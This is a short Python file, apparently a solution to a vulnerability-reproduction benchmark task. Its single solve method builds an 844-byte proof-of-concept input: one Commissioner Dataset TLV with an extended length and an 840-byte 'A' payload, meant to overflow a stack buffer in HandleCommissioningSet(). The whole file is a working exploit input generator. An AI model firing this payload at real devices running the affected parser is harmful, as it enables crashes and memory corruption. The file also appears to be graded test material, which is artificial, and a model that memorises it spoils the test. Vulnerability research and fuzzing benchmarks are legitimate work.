import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a Stack Buffer Overflow
        in the HandleCommissioningSet() function.

        The vulnerability is caused by improper handling of Commissioner Dataset TLVs
        with an extended length. The PoC crafts a single TLV with a large
        extended length field that causes a buffer overflow when its value is copied
        to a fixed-size stack buffer.

        The PoC structure is as follows:
        - 1 byte: TLV Type. A plausible type like 0x05 (Master Key) is used.
        - 1 byte: Length marker. 0xFF indicates an extended length follows.
        - 2 bytes: Extended Length. A value is chosen to make the total PoC
                   size match the ground-truth length of 844 bytes.
                   This results in a payload length of 840 bytes.
        - N bytes: Value/Payload. A sequence of bytes of the specified extended
                   length, which will overwrite the stack buffer.

        Total length = 1 (Type) + 1 (Marker) + 2 (Length) + 840 (Payload) = 844 bytes.
        """

        # TLV Type for a Commissioner Dataset. We use a plausible value.
        # The specific type is often irrelevant as the overflow happens
        # during the generic TLV parsing/copying phase.
        tlv_type = 0x05

        # The special length value indicating an extended length field follows.
        extended_length_marker = 0xFF

        # Calculate payload length to match the ground-truth PoC length of 844.
        # Header size = 1 (type) + 1 (marker) + 2 (ext_len) = 4 bytes.
        # Payload length = 844 - 4 = 840 bytes.
        payload_length = 840

        # Create a mutable byte array to build the PoC.
        poc = bytearray()

        # Append the TLV Type.
        poc.append(tlv_type)

        # Append the extended length marker.
        poc.append(extended_length_marker)

        # Append the 2-byte extended length, packed in big-endian (network) order.
        poc.extend(struct.pack('>H', payload_length))

        # Append the payload, which is large enough to cause the overflow.
        poc.extend(b'A' * payload_length)

        return bytes(poc)